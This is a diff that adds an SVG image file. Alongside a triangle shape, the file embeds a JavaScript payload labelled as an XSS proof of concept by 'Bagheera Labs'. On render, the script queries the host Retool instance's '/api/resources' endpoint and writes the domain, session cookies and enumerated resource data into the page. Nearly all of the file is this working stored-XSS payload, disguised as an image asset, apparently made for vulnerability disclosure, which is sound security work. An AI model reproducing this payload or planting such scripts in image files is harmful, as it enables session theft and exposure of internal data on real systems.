@@ -1,0 +1,29 @@
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+  <script type="text/javascript">
+    fetch('/api/resources')
+      .then(function(r) { return r.json(); })
+      .then(function(d) {
+        document.body.innerHTML = '<div style="font-family:monospace;padding:20px;background:#111;color:#0f0">'
+          + '<h1>XSS PoC - Bagheera Labs</h1>'
+          + '<p>Domain: ' + document.domain + '</p>'
+          + '<p>Cookies: ' + document.cookie + '</p>'
+          + '<hr/>'
+          + '<h2>Retool Resources Enumerated</h2>'
+          + '<pre>' + JSON.stringify(d, null, 2) + '</pre>'
+          + '</div>';
+      })
+      .catch(function(e) {
+        document.body.innerHTML = '<div style="font-family:monospace;padding:20px;background:#111;color:#f00">'
+          + '<h1>XSS PoC - Bagheera Labs</h1>'
+          + '<p>Domain: ' + document.domain + '</p>'
+          + '<p>Cookies: ' + document.cookie + '</p>'
+          + '<hr/>'
+          + '<p>Resource fetch failed: ' + e + '</p>'
+          + '<p>XSS execution confirmed regardless.</p>'
+          + '</div>';
+      });
+  </script>
+</svg>
